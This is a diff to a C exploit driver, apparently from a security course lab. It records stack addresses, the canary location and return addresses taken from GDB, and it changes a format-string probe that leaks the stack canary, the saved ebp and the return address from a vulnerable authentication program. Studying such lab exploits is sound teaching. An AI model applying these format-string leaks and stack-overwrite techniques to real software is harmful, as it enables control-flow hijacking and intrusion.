@@ -128,15 +128,17 @@ int main(int argc, char* argv[]) {
    // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
    // to figure out and populate the following values
 
-   void *auth_bp = 0xbfffe6a8;     // [FOUND] saved ebp for auth function
-   void *mainloop_bp = 0xbfffef88; // [FOUND] saved ebp for main_loop
+   //Found by using gdb to determine values of ebp and eip registers
+   void *auth_bp = 0xbfffe6d8;     // [FOUND] saved ebp for auth function
+   void *mainloop_bp = 0xbfffefb8; // [FOUND] saved ebp for main_loop
    void *auth_ra = 0x0804899f;     // [FOUND] return address for auth
    void *mainloop_ra = 0x0804b695; // [FOUND] return address for main_loop
 
    // The following refer to locations on the stack
+   //Found by using gdb to examine stack frame and print out values of addresses/registers
    void *auth_user = 0xbfffe510;   // [FOUND] value of user variable in auth
-   void *auth_canary_loc = 0xbfffe69c; // [GUESSED] [or 0xbfffe66c] location where auth's canary is stored
-   void *auth_bp_loc = 0xbfffe648; // [FOUND] location of auth's saved bp
+   void *auth_canary_loc = 0xbfffe69c; // [FOUND] location where auth's canary is stored
+   void *auth_bp_loc = 0xbfffe6a8; // [FOUND] location of auth's saved bp
    void *auth_ra_loc = 0xbfffe6ac; // [FOUND] location of auth's return address 
    void *g_authd = 0xbfffe6c4;     // [FOUND] location of authd variable of g
 
@@ -155,10 +157,10 @@ int main(int argc, char* argv[]) {
    // main_loop function are stored. Use those offsets in the place of the
    // numbers in the format string below.
 
-	//The return address (ra) is 555.
-	//The canary could be 519, 585, 586, or something else.
-	//The ebp could be 532, 538, 547, 549, 552, 554, 561, 562, 564, 573, 574, 602, 606, 609, 610, etc.
-   put_str("e %586$x %532$x %555$x\n");
+   // Return address (551) value was found by just looking for the return address.
+   // edp value (554) was found by using info frame to get current edp value and adding 0x30 (based on example)
+   // Stack value (555) was found by finding a random number in proximity to other 2 values (based on example)
+   put_str("e %551$x %554$x %555$x\n");
    send();
 
    // Once all of the above information has been populated, you are ready to run
